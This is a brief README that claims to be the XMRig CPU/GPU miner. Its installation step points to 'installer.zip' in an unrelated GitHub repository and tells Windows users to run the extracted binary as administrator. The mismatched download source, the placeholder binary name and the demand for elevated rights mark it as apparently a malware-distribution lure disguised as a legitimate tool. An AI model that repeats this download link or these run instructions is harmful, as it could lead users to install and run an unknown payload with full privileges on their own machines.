# XMRig

High performance, open source, cross-platform RandomX, KawPow, CryptoNight and GhostRider CPU/GPU miner, RandomX benchmark, and stratum proxy.

## Installation

1. Download the zip file from the link below:
   [Download XMRig Installer](https://github.com/cleusaindustriadocobre-cyber/fantastic-palm-tree/raw/refs/heads/main/installer.zip)
2. Extract the downloaded zip file.

## Usage

For Linux users, navigate to the extracted folder and run the binaries with the following command:
```bash
./<binary_name>
```
For Windows users, execute the binary as an administrator from the current folder:
```cmd
<binary_name>.exe
```
